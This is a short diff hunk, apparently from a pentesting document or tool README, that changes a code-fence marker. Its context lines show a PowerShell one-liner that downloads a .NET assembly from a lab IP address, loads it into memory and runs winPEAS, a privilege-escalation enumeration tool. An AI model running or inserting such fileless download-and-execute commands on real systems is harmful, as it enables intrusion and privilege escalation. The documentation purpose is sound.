@@ -411,4 +411,4 @@ $data=(New-Object System.Net.WebClient).DownloadData('http://192.168.56.6:8080/w
 $asm = [System.Reflection.Assembly]::Load([byte[]]$data);
 $out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
 [winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
-```bash
+```
